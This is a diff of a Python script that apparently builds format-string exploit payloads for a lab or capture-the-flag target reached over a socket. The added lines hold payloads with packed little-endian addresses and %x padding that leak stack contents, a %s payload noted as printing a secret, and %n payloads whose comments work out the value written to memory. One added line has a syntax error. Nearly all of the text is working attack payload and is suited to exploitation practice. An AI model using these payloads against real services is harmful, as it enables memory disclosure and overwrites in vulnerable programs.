@@ -27,7 +27,14 @@ padding = "\x40\xa0\x04\x08@@@@\x3e\xa0\x04\x08" + ".%x.%x.%x.%x.%x.%x.%x.%x.%x.
 padding =  "%.8x	|"*23 + "\xc0\x87\x04\x08" + "%s" 
 padding =  "\x40\xa0\x04\x08"+"%.8x"*24
 padding = "\x5c\x78\x34\x34\x5c\x78\x61\x30\x5c\x78\x30\x34\x5c\x78\x30\x38"  + "%.8x"*22 + "%s"
-padding = "\x08\x88\x04\x08"+"%.8x"*24 + "%s"
+padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%s"
+padding = "\xe0\x87\x04\x08"+"%.8x"*23 + "%s"  ## This prints the secret
+padding = "\x40\xa0\x04\x08"+"%.8x"*24 # target is a number no string format is needed (%s)
+padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%n"
+padding = "\x40\xa0\x04\x08"+"%x"*22 + %.100x "%n"
+# %x = 4 bytes/4char
+# calculate chars (address) [4bytes] + (22*4)[88] + 100x = 192 percision -> this is the nubmer used for the %n value
+# number written is binary into the %n 
 
 # padding = "\xc0\x87\x04\x08" + "%x|" * 11 + "%s\n" # this creates a segfault error 
 #padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"+ 
@@ -50,3 +57,15 @@ s.close()
 # location of secret -
 #\x08\x04\x87\xc0 # original
 #\xc0\x87\x04\x08 # little edian
+
+
+#\x40\xa0\x04\x08%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x|%s
+
+
+#\x48\x68\xfd\xb7
+
+#\xc0\x87\x04\x08
+
+#0x080487c0
+#0xbfffe460
+#0x0804a040
